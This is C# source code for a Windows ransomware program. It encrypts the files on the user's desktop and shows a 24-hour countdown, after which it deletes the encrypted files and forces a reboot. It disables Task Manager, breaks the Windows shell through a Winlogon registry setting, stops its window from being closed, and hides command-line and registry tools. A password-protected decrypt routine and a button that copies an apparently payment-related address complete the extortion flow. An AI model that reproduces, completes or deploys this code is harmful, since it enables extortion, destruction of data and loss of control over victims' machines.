using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace ransomware
{
    public partial class ransomware : Form
    {
        Thread timer = default(Thread);
        Thread cleaner = default(Thread);
        List<string> targets = GetTargets();
        
        // For hiding process
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);
        public ransomware()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            // Hide the form
            this.Opacity = 0.0;
        }
        private void btn_decrypt_Click(object sender, EventArgs e)
        {
            if (CryptoKit.ValidatePassword(txtbox_password.Text))
            {
                // Stop the timer.
                // Kill both timer and cleaner
                CloseThreads();
                MessageBox.Show("Valid password", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                // Enable taskmanager
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                // Repair shell
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);

                int cnt = Withdraw(targets);
                MessageBox.Show(cnt + " files have been decrypted.");

                // Kill the application
                Process[] procs = null;
                procs = Process.GetProcessesByName("ransomware");
                foreach (Process proc in procs)
                {
                    proc.Kill();
                }
            }
            else
            {
                MessageBox.Show("Unvalid password", "WRONG PASSWORD", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public static List<string> GetTargets()
        {
            List<string> list_targets = new List<string>();

            // Get path to user desktop
            string path_desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            list_targets.AddRange(GetListFiles(path_desktop));

            /////////// MASS INFECTION
            //string profile = Environment.GetEnvironmentVariable("USERPROFILE");
            //string userdir = Directory.GetParent(profile).FullName;
            //List<string> drives = GetListStorageDrives();
            //foreach(string drive in drives)
            //{
            //    list_targets.AddRange(GetListFiles(drive));
            //}

            return list_targets;
        }
        private void TimerInterval(int hours)
        {
            int seconds = hours * 60 * 60 - 1;

            while (seconds >= 0)
            {
                var_timer.Text = TimeSpan.FromSeconds(seconds).ToString();
                Thread.Sleep(1000);
                seconds--;
            }
            // Delete all encrypted files
            foreach(string t in targets)
            {
                File.Delete(t);
            }

            // Shut down the victim machine
            Process.Start("shutdown", "/r /t 0");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Spread to profile directory of all users
            // Return number of infected files
            int cnt = Spread(targets);

            // Print out number of infected files
            var_countfiles.Text = cnt.ToString();

            // Wait for the ransomware to done the encryption
            // Show up the application
            Thread.Sleep(3000);
            this.Opacity = 1.0;

            // Set up timer
            int hours = 24;
            timer = new Thread(() => TimerInterval(hours));
            timer.Start();

            // Set up cleaner
            cleaner = new Thread(() => HideProcessInterval());
            cleaner.Start();

            // Disable taskmanager
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            // Remove wallpaper
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
            // Mess with the victim's Windows so that they can not be left in peace, if they intend to turn off the computer
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "empty", RegistryValueKind.String);
        }
        // Prevent user from canceling the application
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
        // Hide particular processes
        private void HideProcessInterval()
        {
            while (true)
            {
                int hWnd;
                Process[] processRunning = Process.GetProcesses();
                foreach (Process proc in processRunning)
                {
                    if (proc.ProcessName == "cmd")
                    {
                        hWnd = proc.MainWindowHandle.ToInt32();
                        ShowWindow(hWnd, SW_HIDE);
                    }
                    if (proc.ProcessName == "regedit")
                    {
                        hWnd = proc.MainWindowHandle.ToInt32();
                        ShowWindow(hWnd, SW_HIDE);
                    }
                    if (proc.ProcessName == "Processhacker")
                    {
                        hWnd = proc.MainWindowHandle.ToInt32();
                        ShowWindow(hWnd, SW_HIDE);
                    }
                    if (proc.ProcessName == "sdclt")
                    {
                        hWnd = proc.MainWindowHandle.ToInt32();
                        ShowWindow(hWnd, SW_HIDE);
                    }
                    if(proc.ProcessName == "powershell")
                    {
                        hWnd = proc.MainWindowHandle.ToInt32();
                        ShowWindow(hWnd, SW_HIDE);
                    }
                }
                Thread.Sleep(200);
            }
        }
        private void CloseThreads()
        {
            if(timer != default(Thread))
                timer.Abort();
            if (cleaner != default(Thread))
                cleaner.Abort();
        }
        private static List<string> GetListStorageDrives()
        {
            string os_dir = Environment.GetEnvironmentVariable("WINDIR");
            DriveInfo[] drives = DriveInfo.GetDrives();
            List<string> list_drives = new List<string>();
            foreach (DriveInfo drive in drives)
            {
                if (!os_dir.Contains(drive.ToString()))
                {
                    list_drives.Add(drive.ToString());
                }
            }
            return list_drives;
        }
        // benign
        private static bool RemoveFileAttr(string filename)
        {
            try
            {
                var attr = File.GetAttributes(filename);
                if ((attr & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    attr &= ~FileAttributes.Hidden;
                    File.SetAttributes(filename, attr);
                }
                if ((attr & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                {
                    attr &= ~FileAttributes.Hidden;
                    File.SetAttributes(filename, attr);
                }
            }
            catch (Exception)
            {
                return false;
            }
            return true;
        }
        // benign
        private static List<string> GetListFiles(string rootDirectory)
        {
            IEnumerable<string> paths = Traverse(rootDirectory);
            List<string> list_files = new List<string>();
            foreach (string filename in paths.ToList())
            {
                try
                {
                    FileAttributes attr = File.GetAttributes(filename);
                    if (attr.HasFlag(FileAttributes.Directory))
                    {
                        continue;
                    }
                    if (RemoveFileAttr(filename))
                    {
                        list_files.Add(filename);
                    }
                }
                catch (Exception)
                {
                    continue;
                }
            }
            return list_files;

        }
        // benign
        private static IEnumerable<string> Traverse(string rootDirectory)
        {
            IEnumerable<string> files = Enumerable.Empty<string>();
            IEnumerable<string> directories = Enumerable.Empty<string>();
            try
            {
                // The test for UnauthorizedAccessException.
                // If the file or folder we are traversing to is not accessible due to lack of permission,
                // we will ignore the file and continue traversing.
                var permission = new FileIOPermission(FileIOPermissionAccess.PathDiscovery, rootDirectory);
                permission.Demand();

                // 
                files = Directory.GetFiles(rootDirectory);
                directories = Directory.GetDirectories(rootDirectory);
            }
            catch
            {
                // Ignore folder, which gives access denied.
                rootDirectory = null;
            }

            if (rootDirectory != null)
                yield return rootDirectory;

            foreach (var file in files)
            {
                yield return file;
            }

            // Recursive call for SelectMany.
            var subdirectoryItems = directories.SelectMany(Traverse);
            foreach (var result in subdirectoryItems)
            {
                yield return result;
            }
        }
        // benign
        private void btn_copyaddr_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(txtbox_addr.Text);
        }
        private static int Spread(List<string> files)
        {
            int cnt = 0;
            for (int i = 0; i < files.Count; i++)
            {
                if (CryptoKit.EncryptFile(files[i]))
                {
                    cnt++;
                }
            }

            return cnt;
        }
        // Decrypt list of target files
        private static int Withdraw(List<string> files)
        {
            int cnt = 0;
            for (int i = 0; i < files.Count; i++)
            {
                if (CryptoKit.DecryptFile(files[i]))
                {
                    cnt++;
                }
            }

            return cnt;
        }
        // benign
        private void txtbox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                btn_decrypt_Click(this, new EventArgs());
            }
        }
    }
}
